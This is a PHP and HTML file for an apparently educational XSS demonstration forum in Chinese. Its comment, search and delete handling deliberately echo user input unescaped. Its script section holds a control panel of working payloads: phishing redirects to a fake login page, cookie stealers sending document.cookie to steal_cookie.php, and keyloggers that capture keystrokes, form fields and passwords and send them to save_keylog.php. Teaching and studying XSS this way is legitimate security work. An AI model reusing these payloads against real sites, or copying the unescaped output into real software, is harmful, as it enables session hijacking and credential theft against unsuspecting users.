<?php
/**
 * XSS漏洞演示论坛
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

// 初始化评论文件
$commentsFile = 'forum_comments.txt';
if(file_exists($commentsFile)) {
    $content = file_get_contents($commentsFile);
    $comments = json_decode($content, true);
    // 如果解码失败或为空，初始化为空数组
    if(!is_array($comments)) {
        $comments = [];
    }
} else {
    $comments = [];
}

// 处理删除评论
if(isset($_GET['delete']) && !empty($_GET['delete'])) {
    $deleteId = $_GET['delete'];
    $comments = array_filter($comments, function($comment) use ($deleteId) {
        return $comment['id'] !== $deleteId;
    });
    $comments = array_values($comments);
    file_put_contents($commentsFile, json_encode($comments));
    header('Location: forum.php');
    exit;
}

// 处理评论提交
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(trim($_POST['comment']))) {
    $newComment = [
        'id' => uniqid(),
        'author' => '游客' . rand(1000, 9999),
        'content' => $_POST['comment'],
        'time' => date('Y-m-d H:i:s'),
        'avatar' => strtoupper(substr(md5(time()), 0, 1))
    ];
    $comments[] = $newComment;
    file_put_contents($commentsFile, json_encode($comments));
    header('Location: forum.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>技术交流论坛 - TechForum</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header-top {
            background: rgba(0,0,0,0.1);
            padding: 8px 0;
            font-size: 13px;
        }
        .header-top .container { display: flex; justify-content: space-between; align-items: center; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .header-main { padding: 15px 0; }
        .header-main .container { display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 24px; font-weight: bold; display: flex; align-items: center; gap: 10px; }
        .logo-icon { font-size: 30px; }
        .nav { display: flex; gap: 30px; }
        .nav a { color: white; text-decoration: none; font-size: 15px; opacity: 0.9; transition: opacity 0.3s; }
        .nav a:hover { opacity: 1; }
        .search-box { display: flex; gap: 10px; }
        .search-box input { padding: 8px 15px; border: none; border-radius: 20px; width: 250px; font-size: 14px; }
        .search-box button { padding: 8px 20px; background: rgba(255,255,255,0.2); border: none; border-radius: 20px; color: white; cursor: pointer; transition: background 0.3s; }
        .search-box button:hover { background: rgba(255,255,255,0.3); }
        .user-info { display: flex; align-items: center; gap: 15px; }
        .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.3); display: flex; align-items: center; justify-content: center; }
        .main { padding: 20px 0; }
        .breadcrumb { padding: 15px 0; color: #666; font-size: 14px; }
        .breadcrumb a { color: #667eea; text-decoration: none; }
        .content-wrapper { display: flex; gap: 20px; }
        .main-content { flex: 1; }
        .sidebar { width: 300px; }
        .post-detail { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow: hidden; }
        .post-header { padding: 20px; border-bottom: 1px solid #eee; }
        .post-title { font-size: 22px; color: #333; margin-bottom: 10px; }
        .post-meta { display: flex; gap: 20px; color: #999; font-size: 13px; }
        .post-body { padding: 20px; font-size: 15px; line-height: 1.8; }
        .post-body p { margin-bottom: 15px; }
        .post-body pre { background: #f8f8f8; padding: 15px; border-radius: 5px; overflow-x: auto; margin: 15px 0; }
        .post-body code { background: #f8f8f8; padding: 2px 6px; border-radius: 3px; font-family: Consolas, monospace; }
        .post-footer { padding: 15px 20px; background: #fafafa; display: flex; justify-content: space-between; align-items: center; }
        .post-actions { display: flex; gap: 20px; }
        .post-actions a { color: #666; text-decoration: none; font-size: 14px; display: flex; align-items: center; gap: 5px; }
        .post-actions a:hover { color: #667eea; }
        .comments-section { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-top: 20px; }
        .comments-header { padding: 15px 20px; border-bottom: 1px solid #eee; font-weight: bold; }
        .comment-form { padding: 20px; border-bottom: 1px solid #eee; }
        .comment-form textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; resize: vertical; min-height: 80px; font-size: 14px; }
        .comment-form textarea:focus { outline: none; border-color: #667eea; }
        .comment-form-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .comment-form-actions button { padding: 8px 25px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .comment-form-actions button:hover { background: #5a6fd6; }
        .comment-item { padding: 20px; border-bottom: 1px solid #eee; }
        .comment-item:last-child { border-bottom: none; }
        .comment-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
        .comment-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
        .comment-author { font-weight: bold; }
        .comment-time { color: #999; font-size: 13px; }
        .comment-content { margin-left: 50px; font-size: 14px; line-height: 1.6; }
        .sidebar-card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 20px; overflow: hidden; }
        .sidebar-card-header { padding: 15px; background: #fafafa; border-bottom: 1px solid #eee; font-weight: bold; }
        .sidebar-card-body { padding: 15px; }
        .author-info { display: flex; align-items: center; gap: 15px; }
        .author-avatar { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; font-weight: bold; }
        .author-name { font-weight: bold; font-size: 16px; }
        .author-title { color: #999; font-size: 13px; margin-top: 3px; }
        .author-stats { display: flex; gap: 20px; margin-top: 15px; }
        .author-stat { text-align: center; }
        .author-stat-value { font-weight: bold; color: #667eea; }
        .author-stat-label { font-size: 12px; color: #999; }
        .hot-posts li { padding: 10px 0; border-bottom: 1px solid #eee; list-style: none; }
        .hot-posts li:last-child { border-bottom: none; }
        .hot-posts a { color: #333; text-decoration: none; font-size: 14px; }
        .hot-posts a:hover { color: #667eea; }
        .hot-posts .post-views { font-size: 12px; color: #999; margin-top: 3px; }
        .notice-item { padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
        .notice-item:last-child { border-bottom: none; }
        .notice-item a { color: #667eea; text-decoration: none; }
        .pagination { display: flex; justify-content: center; gap: 5px; margin-top: 20px; }
        .pagination a { padding: 8px 12px; background: white; border: 1px solid #ddd; border-radius: 3px; text-decoration: none; color: #333; font-size: 14px; }
        .pagination a:hover, .pagination a.active { background: #667eea; color: white; border-color: #667eea; }
        .footer { background: #333; color: #999; padding: 30px 0; margin-top: 40px; }
        .footer-content { display: flex; justify-content: space-between; }
        .footer-links a { color: #999; text-decoration: none; margin-right: 20px; font-size: 14px; }
        .footer-links a:hover { color: white; }
        .footer-copyright { font-size: 13px; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 12px; margin-left: 5px; }
        .badge-admin { background: #e74c3c; color: white; }
        .badge-vip { background: #f39c12; color: white; }
        .reply-to { color: #667eea; font-size: 13px; }
        .notice-date { font-size: 12px; color: #999; margin-left: 10px; }
        .comment-actions { margin-left: auto; display: flex; gap: 10px; }
        .btn-delete { color: #e74c3c; text-decoration: none; font-size: 12px; padding: 3px 8px; border: 1px solid #e74c3c; border-radius: 3px; transition: all 0.3s; }
        .btn-delete:hover { background: #e74c3c; color: white; }
        .btn-back-demo {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 24px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            z-index: 9999;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .btn-back-demo:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
    </style>
</head>
<body>
    <a href="demo.php" class="btn-back-demo">
        <span>🏠</span>
        <span>返回演示首页</span>
    </a>
    <div class="header">
        <div class="header-top">
            <div class="container">
                <div>欢迎来到技术交流论坛！今天是 <?php echo date('Y年m月d日'); ?></div>
                <div class="user-info">
                    <span>👤 游客</span>
                    <a href="#" style="color: white; margin-left: 15px;">登录</a>
                    <a href="#" style="color: white; margin-left: 15px;">注册</a>
                </div>
            </div>
        </div>
        <div class="header-main">
            <div class="container">
                <div class="logo">
                    <span class="logo-icon">💬</span>
                    TechForum 技术交流论坛
                </div>
                <div class="nav">
                    <a href="#">首页</a>
                    <a href="#">技术讨论</a>
                    <a href="#">问答专区</a>
                    <a href="#">资源分享</a>
                    <a href="#">活动中心</a>
                </div>
            </div>
        </div>
    </div>

    <div class="main">
        <div class="container">
            <div class="breadcrumb">
                <a href="#">首页</a> › <a href="#">技术讨论</a> › <a href="#">Web安全</a> › 帖子详情
            </div>
            
            <div class="content-wrapper">
                <div class="main-content">
                    <div class="post-detail">
                        <div class="post-header">
                            <h1 class="post-title">Web安全入门：常见漏洞原理与防护实践分享</h1>
                            <div class="post-meta">
                                <span>👤 作者：安全小白</span>
                                <span>📅 发布于：2024-01-15 10:30</span>
                                <span>👁 阅读：1285</span>
                                <span>💬 评论：<?php echo is_array($comments) ? count($comments) : 0; ?></span>
                            </div>
                        </div>
                        <div class="post-body">
                            <p>大家好，最近在学习Web安全相关的知识，想和大家分享一些常见Web漏洞的原理和防护方法。作为入门级别的分享，希望能帮助到同样刚入门的朋友们。</p>
                            
                            <p><strong>一、SQL注入漏洞</strong></p>
                            <p>SQL注入是最常见的Web安全漏洞之一。攻击者通过在输入框中插入恶意的SQL语句，来操纵数据库执行非预期的操作。</p>
                            <pre>SELECT * FROM users WHERE username = '$username' AND password = '$password'</pre>
                            <p>防护方法：使用参数化查询、输入验证、最小权限原则等。</p>
                            
                            <p><strong>二、XSS跨站脚本攻击</strong></p>
                            <p>XSS攻击允许攻击者将恶意脚本注入到网页中，当其他用户浏览该网页时，脚本就会执行。XSS分为反射型、存储型和DOM型三种。</p>
                            
                            <p><strong>三、CSRF跨站请求伪造</strong></p>
                            <p>CSRF攻击利用用户已认证的身份，在用户不知情的情况下执行恶意操作。</p>
                            
                            <p>希望这些内容对大家有帮助，欢迎在评论区交流讨论！</p>
                        </div>
                        <div class="post-footer">
                            <div class="post-actions">
                                <a href="#">👍 点赞 (56)</a>
                                <a href="#">⭐ 收藏 (23)</a>
                                <a href="#">🔗 分享</a>
                                <a href="#">📋 举报</a>
                            </div>
                        </div>
                    </div>

                    <div class="comments-section">
                        <div class="comments-header">💬 评论区</div>
                        
                        <!-- XSS演示控制面板 -->
                        <div class="demo-panel">
                            <div class="demo-panel-header">🎯 XSS攻击演示控制台</div>
                            <div class="demo-panel-body">
                                <div class="demo-row">
                                    <label>攻击类型：</label>
                                    <select id="attackType" class="demo-select" onchange="updatePayloadOptions()">
                                        <option value="phishing">🎣 钓鱼攻击（窃取账号密码）</option>
                                        <option value="cookie">🍪 Cookie窃取</option>
                                        <option value="keylogger">⌨️ 键盘记录（窃取输入）</option>
                                    </select>
                                </div>
                                <div class="demo-row">
                                    <label>选择Payload：</label>
                                    <select id="payloadSelect" class="demo-select">
                                        <option value="confirm">确认框跳转（推荐）</option>
                                        <option value="auto">自动跳转</option>
                                        <option value="delay">延迟3秒跳转</option>
                                        <option value="img">图片隐藏方式</option>
                                        <option value="baidu">跳转百度</option>
                                    </select>
                                </div>
                                <div class="demo-buttons">
                                    <button class="demo-btn demo-btn-primary" onclick="injectPayload()">
                                        📥 注入Payload
                                    </button>
                                    <button class="demo-btn demo-btn-danger" onclick="triggerXSS()">
                                        🚀 触发XSS攻击
                                    </button>
                                    <button class="demo-btn demo-btn-warning" onclick="clearPayload()">
                                        🗑️ 清除Payload
                                    </button>
                                </div>
                                <div class="demo-info">
                                    <p>💡 提示：注入Payload后，刷新页面或点击"触发XSS攻击"按钮即可演示攻击效果</p>
                                    <p id="cookieInfo" style="display:none;">📊 查看窃取的Cookie：<a href="viewer.php?tab=cookies" target="_blank" style="color:#e74c3c;font-weight:bold;">点击查看Cookie数据</a></p>
                                    <p id="keyloggerInfo" style="display:none;">📊 查看键盘记录：<a href="viewer.php?tab=keylogs" target="_blank" style="color:#e74c3c;font-weight:bold;">点击查看键盘记录</a></p>
                                </div>
                            </div>
                        </div>
                        
                        <div class="comment-form">
                            <form method="POST" action="">
                                <textarea name="comment" placeholder="写下你的评论..."></textarea>
                                <div class="comment-form-actions">
                                    <div style="color: #999; font-size: 13px;">
                                        支持简单的HTML标签，如 &lt;b&gt;, &lt;i&gt;, &lt;a&gt; 等
                                    </div>
                                    <button type="submit">发表评论</button>
                                </div>
                            </form>
                        </div>

                        <?php
                        // 显示评论
                        if(!empty($comments)):
                            foreach(array_reverse($comments) as $comment):
                        ?>
                        <div class="comment-item">
                            <div class="comment-header">
                                <div class="comment-avatar"><?php echo $comment['avatar']; ?></div>
                                <div>
                                    <div class="comment-author"><?php echo $comment['author']; ?></div>
                                    <div class="comment-time"><?php echo $comment['time']; ?></div>
                                </div>
                                <div class="comment-actions">
                                    <a href="?delete=<?php echo $comment['id']; ?>" class="btn-delete" onclick="return confirm('确定要删除这条评论吗？');">🗑️ 删除</a>
                                </div>
                            </div>
                            <div class="comment-content">
                                <?php echo $comment['content']; ?>
                            </div>
                        </div>
                        <?php 
                            endforeach;
                        else:
                        ?>
                        <div class="comment-item" style="text-align: center; color: #999;">
                            暂无评论，快来抢沙发吧！
                        </div>
                        <?php endif; ?>
                        
                        <?php if(count($comments) > 5): ?>
                        <div class="pagination">
                            <a href="#" class="active">1</a>
                            <a href="#">2</a>
                            <a href="#">3</a>
                            <a href="#">下一页</a>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>

                <div class="sidebar">
                    <div class="sidebar-card">
                        <div class="sidebar-card-header">👤 作者信息</div>
                        <div class="sidebar-card-body">
                            <div class="author-info">
                                <div class="author-avatar">安</div>
                                <div>
                                    <div class="author-name">安全小白 <span class="badge badge-vip">VIP</span></div>
                                    <div class="author-title">Web安全爱好者</div>
                                </div>
                            </div>
                            <div class="author-stats">
                                <div class="author-stat">
                                    <div class="author-stat-value">128</div>
                                    <div class="author-stat-label">帖子</div>
                                </div>
                                <div class="author-stat">
                                    <div class="author-stat-value">1.2k</div>
                                    <div class="author-stat-label">粉丝</div>
                                </div>
                                <div class="author-stat">
                                    <div class="author-stat-value">3.5k</div>
                                    <div class="author-stat-label">获赞</div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="sidebar-card">
                        <div class="sidebar-card-header">🔥 热门帖子</div>
                        <div class="sidebar-card-body">
                            <ul class="hot-posts">
                                <li>
                                    <a href="#">2024年最值得学习的10个安全认证</a>
                                    <div class="post-views">👁 2.3k 阅读</div>
                                </li>
                                <li>
                                    <a href="#">CTF比赛入门指南：从零开始</a>
                                    <div class="post-views">👁 1.8k 阅读</div>
                                </li>
                                <li>
                                    <a href="#">渗透测试工具推荐与使用技巧</a>
                                    <div class="post-views">👁 1.5k 阅读</div>
                                </li>
                                <li>
                                    <a href="#">企业安全建设最佳实践分享</a>
                                    <div class="post-views">👁 1.2k 阅读</div>
                                </li>
                            </ul>
                        </div>
                    </div>

                    <div class="sidebar-card">
                        <div class="sidebar-card-header">📢 论坛公告</div>
                        <div class="sidebar-card-body">
                            <div class="notice-item">
                                <a href="#">论坛新版上线，功能全面升级！</a>
                                <span class="notice-date">01-10</span>
                            </div>
                            <div class="notice-item">
                                <a href="#">关于禁止发布非法内容的声明</a>
                                <span class="notice-date">01-05</span>
                            </div>
                            <div class="notice-item">
                                <a href="#">招募版主，欢迎积极用户报名</a>
                                <span class="notice-date">12-28</span>
                            </div>
                        </div>
                    </div>

                    <div class="sidebar-card">
                        <div class="sidebar-card-header">🔍 搜索帖子</div>
                        <div class="sidebar-card-body">
                            <form method="GET" action="" class="search-box" style="flex-wrap: wrap;">
                                <input type="text" name="q" placeholder="输入关键词搜索..." style="width: 100%; margin-bottom: 10px; border: 1px solid #ddd;" value="<?php echo isset($_GET['q']) ? $_GET['q'] : ''; ?>">
                                <button type="submit" style="width: 100%;">搜索</button>
                            </form>
                            <?php if(isset($_GET['q']) && !empty($_GET['q'])): ?>
                            <div style="margin-top: 15px; padding: 10px; background: #f5f5f5; border-radius: 5px;">
                                <strong>搜索结果：</strong>
                                <p style="margin-top: 5px;">找到与 "<?php echo $_GET['q']; ?>" 相关的内容</p>
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-links">
                    <a href="#">关于我们</a>
                    <a href="#">联系方式</a>
                    <a href="#">用户协议</a>
                    <a href="#">隐私政策</a>
                    <a href="#">帮助中心</a>
                </div>
                <div class="footer-copyright">
                    © 2024 TechForum 技术交流论坛 版权所有
                </div>
            </div>
        </div>
    </div>

    <script>
    // 钓鱼攻击Payload模板
    const phishingPayloads = {
        confirm: '<scr' + 'ipt>\nif(!window.location.search.includes("logged_in=1")) {\n    if(confirm("检测到新版本，是否立即更新？")) {\n        window.location.href = "phishing/login.html?redirect=" + encodeURIComponent(window.location.href);\n    }\n}\n</scr' + 'ipt>',
        
        auto: '<scr' + 'ipt>\nif(!window.location.search.includes("logged_in=1")) {\n    window.location.href = "phishing/login.html?redirect=" + encodeURIComponent(window.location.href);\n}\n</scr' + 'ipt>',
        
        delay: '<scr' + 'ipt>\nif(!window.location.search.includes("logged_in=1")) {\n    setTimeout(function() {\n        window.location.href = "phishing/login.html?redirect=" + encodeURIComponent(window.location.href);\n    }, 3000);\n}\n</scr' + 'ipt>',
        
        img: '<img src=x onerror="if(!window.location.search.includes(\'logged_in=1\')) window.location.href=\'phishing/login.html?redirect=\'+encodeURIComponent(window.location.href)">\n'
    };
    
    // Cookie窃取Payload模板
    const cookiePayloads = {
        img: '<img src=x onerror="this.src=\'steal_cookie.php?c=\'+encodeURIComponent(document.cookie)">',
        
        script: '<scr' + 'ipt>\nnew Image().src = "steal_cookie.php?c=" + encodeURIComponent(document.cookie);\n</scr' + 'ipt>',
        
        fetch: '<scr' + 'ipt>\nfetch("steal_cookie.php?c=" + encodeURIComponent(document.cookie));\n</scr' + 'ipt>',
        
        ajax: '<scr' + 'ipt>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "steal_cookie.php?c=" + encodeURIComponent(document.cookie), true);\nxhr.send();\n</scr' + 'ipt>'
    };
    
    // 键盘记录Payload模板
    const keyloggerPayloads = {
        basic: '<scr' + 'ipt>\n// 键盘记录演示\n(function() {\n    var keys = "";\n    document.addEventListener("keydown", function(e) {\n        var key = e.key;\n        if(key === " ") key = "[Space]";\n        if(key === "Enter") key = "[Enter]";\n        if(key === "Tab") key = "[Tab]";\n        if(key === "Backspace") key = "[Backspace]";\n        keys += key;\n        // 发送到服务器\n        fetch("save_keylog.php?k=" + encodeURIComponent(keys));\n    });\n})();\n</scr' + 'ipt>',
        
        advanced: '<scr' + 'ipt>\n// 高级键盘记录演示\n(function() {\n    var buffer = "";\n    var timer = null;\n    \n    function sendKeys() {\n        if(buffer.length > 0) {\n            fetch("save_keylog.php?k=" + encodeURIComponent(buffer));\n            buffer = "";\n        }\n    }\n    \n    document.addEventListener("keydown", function(e) {\n        var key = e.key;\n        if(key === " ") key = "[Space]";\n        if(key === "Enter") {\n            key = "[Enter]";\n            buffer += key;\n            sendKeys();\n            return;\n        }\n        if(key === "Tab") key = "[Tab]";\n        if(key === "Backspace") key = "[Backspace]";\n        \n        buffer += key;\n        \n        // 每输入10个字符发送一次\n        if(buffer.length >= 10) {\n            sendKeys();\n        }\n        \n        // 3秒无输入也发送\n        clearTimeout(timer);\n        timer = setTimeout(sendKeys, 3000);\n    });\n    \n    // 页面卸载时发送剩余内容\n    window.addEventListener("beforeunload", sendKeys);\n})();\n</scr' + 'ipt>',
        
        form: '<scr' + 'ipt>\n// 表单输入记录演示\n(function() {\n    // 监听所有input和textarea\n    var inputs = document.querySelectorAll("input, textarea");\n    inputs.forEach(function(input) {\n        input.addEventListener("input", function(e) {\n            var data = {\n                type: e.target.type || "text",\n                name: e.target.name || "unknown",\n                value: e.target.value\n            };\n            fetch("save_keylog.php?k=" + encodeURIComponent(\n                "[" + data.name + ":" + data.value + "]"\n            ));\n        });\n    });\n})();\n</scr' + 'ipt>',
        
        password: '<scr' + 'ipt>\n// 密码框记录演示\n(function() {\n    var passwordFields = document.querySelectorAll("input[type=\"password\"]");\n    passwordFields.forEach(function(field) {\n        field.addEventListener("input", function(e) {\n            fetch("save_keylog.php?k=" + encodeURIComponent(\n                "[密码:" + e.target.value + "]"\n            ));\n        });\n    });\n})();\n</scr' + 'ipt>'
    };
    
    // 更新Payload选项
    function updatePayloadOptions() {
        const attackType = document.getElementById('attackType').value;
        const payloadSelect = document.getElementById('payloadSelect');
        const cookieInfo = document.getElementById('cookieInfo');
        const keyloggerInfo = document.getElementById('keyloggerInfo');
        
        if(attackType === 'phishing') {
            payloadSelect.innerHTML = `
                <option value="confirm">确认框跳转（推荐）</option>
                <option value="auto">自动跳转</option>
                <option value="delay">延迟3秒跳转</option>
                <option value="img">图片隐藏方式</option>
                <option value="baidu">跳转百度</option>
            `;
            cookieInfo.style.display = 'none';
            keyloggerInfo.style.display = 'none';
        } else if(attackType === 'cookie') {
            payloadSelect.innerHTML = `
                <option value="img">图片方式（推荐）</option>
                <option value="script">Script标签方式</option>
                <option value="fetch">Fetch API方式</option>
                <option value="ajax">AJAX方式</option>
            `;
            cookieInfo.style.display = 'block';
            keyloggerInfo.style.display = 'none';
        } else if(attackType === 'keylogger') {
            payloadSelect.innerHTML = `
                <option value="basic">基础键盘记录（推荐）</option>
                <option value="advanced">高级键盘记录</option>
                <option value="form">表单输入记录</option>
                <option value="password">密码框记录</option>
            `;
            cookieInfo.style.display = 'none';
            keyloggerInfo.style.display = 'block';
        }
    }

    // 注入Payload到评论框
    function injectPayload() {
        const attackType = document.getElementById('attackType').value;
        const select = document.getElementById('payloadSelect');
        const textarea = document.querySelector('textarea[name="comment"]');
        
        let payload;
        let attackName;
        
        if(attackType === 'phishing') {
            // 特殊处理跳转百度的Payload
            if(select.value === 'baidu') {
                payload = '<scr' + 'ipt>\n// XSS演示：跳转百度\nalert("XSS攻击演示！即将跳转到百度首页");\nwindow.location.href = "https://www.baidu.com";\n</scr' + 'ipt>';
            } else {
                payload = phishingPayloads[select.value];
            }
            attackName = '钓鱼攻击';
        } else if(attackType === 'cookie') {
            payload = cookiePayloads[select.value];
            attackName = 'Cookie窃取';
        } else if(attackType === 'keylogger') {
            payload = keyloggerPayloads[select.value];
            attackName = '键盘记录';
        }
        
        if(textarea) {
            textarea.value = payload;
            textarea.style.background = '#fff3cd';
            setTimeout(() => {
                textarea.style.background = '';
            }, 1000);
            
            alert('✅ ' + attackName + ' Payload已注入到评论框！\n请点击"发表评论"按钮提交。');
        }
    }

    // 触发XSS攻击（模拟用户访问被注入的页面）
    function triggerXSS() {
        const attackType = document.getElementById('attackType').value;
        const select = document.getElementById('payloadSelect');
        
        let payload;
        let attackName;
        
        if(attackType === 'phishing') {
            // 特殊处理跳转百度的Payload
            if(select.value === 'baidu') {
                payload = '<scr' + 'ipt>\n// XSS演示：跳转百度\nalert("XSS攻击演示！即将跳转到百度首页");\nwindow.location.href = "https://www.baidu.com";\n</scr' + 'ipt>';
            } else {
                payload = phishingPayloads[select.value];
            }
            attackName = '钓鱼攻击';
        } else if(attackType === 'cookie') {
            payload = cookiePayloads[select.value];
            attackName = 'Cookie窃取';
        } else if(attackType === 'keylogger') {
            payload = keyloggerPayloads[select.value];
            attackName = '键盘记录';
        }
        
        // 创建临时div执行脚本
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = payload;
        document.body.appendChild(tempDiv);
        
        // 执行其中的脚本
        const scripts = tempDiv.getElementsByTagName('script');
        for(let i = 0; i < scripts.length; i++) {
            const script = document.createElement('script');
            script.textContent = scripts[i].textContent;
            document.body.appendChild(script);
        }
        
        // 对于Cookie窃取，显示提示
        if(attackType === 'cookie') {
            setTimeout(() => {
                alert('✅ Cookie已发送到服务器！\n请访问 viewer.php?tab=cookies 查看窃取的数据。');
            }, 500);
        }
        
        // 对于键盘记录，显示提示
        if(attackType === 'keylogger') {
            setTimeout(() => {
                alert('✅ 键盘记录已启动！\n请在页面任意位置输入内容，然后访问 viewer.php?tab=keylogs 查看记录。');
            }, 500);
        }
        
        setTimeout(() => {
            if(tempDiv.parentNode) {
                document.body.removeChild(tempDiv);
            }
        }, 100);
    }

    // 清除已注入的Payload
    function clearPayload() {
        const textarea = document.querySelector('textarea[name="comment"]');
        if(textarea) {
            textarea.value = '';
            alert('✅ 已清空评论框！');
        }
        // 移除URL中的logged_in参数
        if(window.location.search.includes('logged_in=1')) {
            const newUrl = window.location.href.replace(/[?&]logged_in=1/, '');
            window.history.replaceState({}, '', newUrl);
            alert('✅ 已清除登录标记，刷新页面可重新触发XSS！');
        }
    }
    </script>
</body>
</html>